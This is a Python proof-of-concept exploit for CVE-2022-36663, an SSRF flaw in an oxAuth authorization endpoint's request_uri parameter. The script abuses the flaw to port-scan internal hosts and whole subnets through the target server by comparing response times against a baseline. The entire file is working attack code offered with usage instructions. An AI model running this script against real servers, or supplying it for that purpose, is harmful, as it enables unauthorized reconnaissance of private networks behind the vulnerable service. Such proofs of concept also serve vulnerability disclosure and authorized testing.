#!/usr/bin/python3
import sys
import argparse
import re
import ipaddress
import requests
from urllib.parse import unquote

from pyfiglet import Figlet

def AverageRT():
	print('[+] Calculating reference time for unreachable hosts...\n')
	for i in range(1,11):
			r = requests.get(url+authorzation_url+'http://localhost:11111') #checking response time for an unreachable port
			global AverageResponse 
			AverageResponse = AverageResponse + r.elapsed.total_seconds()
	AverageResponse = AverageResponse/10
	print("Average Response time for unreachable hosts: " + str(AverageResponse) + '\n')


def banner():
	banner = Figlet(font='future')
	print(banner.renderText('CVE-2022-36663'))
	
def output(ip,port,result):
	if result == 1:
		print('[+] Port ' + port + ' on host ' + ip + ' is open!\n')
	if result == 0:
		print('[+] Port ' + port + ' on host ' + ip + ' is closed.\n')

def scan(ip,url,port):
	AverageResponse2 = 0
	print('[+] Scanning ' + ip + ':' + port)
	for i in range(1,11):
		r = requests.get(url+authorzation_url+'https://'+ ip + ':' + port)
		AverageResponse2 = AverageResponse2 + r.elapsed.total_seconds()
	AverageResponse2 = AverageResponse2/10
	print("Average Response time for target: " + str(AverageResponse2) + '\n')
	if AverageResponse2 - AverageResponse >= 0.005:
		output(ip,port,1)
	else:
		output(ip,port,0)
	

def main(args):
	global AverageResponse
	AverageResponse = 0
	global ip
	ip = args['ip']
	global authorzation_url
	authorzation_url = unquote(args['ar'])
	global url
	url = args['url']
	global port
	port = args['port']
	pattern = re.compile("^([0-9]{1,3}\.){3}[0-9]{1,3}$")
	pattern2 = re.compile("^([0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2}$")
	#handle single IP
	if pattern.match(ip):
		AverageRT()
		scan(ip,url,port)
		
	#handle subnet
	elif pattern2.match(ip): 
		AverageRT()
		subnet = ip
		ips = ipaddress.IPv4Network(subnet)
		for address in ips:
			scan(address,url,port)
			
	else:
		print("Malformed IP or Subnet - Example: 127.0.0.1 or 10.10.10.10/24")
		sys.exit()
	
	
        

if __name__ == "__main__":
	banner()
	parser = argparse.ArgumentParser(description="CVE-2022-36663 Internal Port Scanner via SSRF",usage="\npython3 CVE-2022-36663.py --url https://target --ip 10.10.10.10 --port 8080 --ar /oxauth/restv1/authorize?client_id=<clientID>&redirect_uri=https://target/return.html&response_type=code&scope=openid+profile+email+user_name&nonce=<nonce>&acr_values=simple_password_auth&request_uri=\n\n")
	parser.add_argument("-i", "--ip", help="Ip address to be scanned", required=True)
	parser.add_argument("-p", "--port", help="Port to be scanned", required=True)
	parser.add_argument("-u", "--url", help="Ip address to be scanned", required=True)
	parser.add_argument("-ar", "--ar", help="Aurhotization request URL ending with redirect_uri=", required=True)
	args = parser.parse_args()
	main(vars(args))